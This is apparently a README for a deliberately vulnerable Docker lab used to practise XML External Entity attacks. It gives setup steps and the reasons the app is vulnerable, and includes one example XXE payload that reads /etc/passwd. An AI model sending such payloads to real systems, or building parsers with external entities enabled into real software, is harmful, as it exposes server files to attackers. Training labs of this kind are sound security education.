# XXE (XML External Entity) Lab

This is a standalone lab environment to practice and understand XXE (XML External Entity) vulnerabilities. The lab demonstrates how XXE vulnerabilities can be exploited in web applications that process XML input.

## Setup Instructions

1. Make sure you have Docker and Docker Compose installed on your system.

2. Clone this repository:
```bash
git clone <repository-url>
cd xxe-lab
```

3. Build and run the Docker container:
```bash
docker-compose up --build
```

4. Access the lab at http://localhost:8000

## Lab Details

The lab consists of a simple web application with a commenting feature. Users can:
1. Enter comments that are processed as XML on the server side
2. View their submitted comments
3. Exploit the XXE vulnerability to read system files

## Vulnerability Details

The application is intentionally vulnerable to XXE attacks because:
1. It uses an XML parser with external entity processing enabled
2. It doesn't validate or sanitize the XML input
3. It reflects the parsed XML content back to users

## Example Payload

```xml
<?xml version='1.0'?>
<!DOCTYPE comm [
<!ELEMENT comm (#PCDATA)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comm>
<text>&xxe;</text>
</comm>
```

## Security Notice

This is a vulnerable application designed for educational purposes. DO NOT deploy it in a production environment or expose it to the internet. 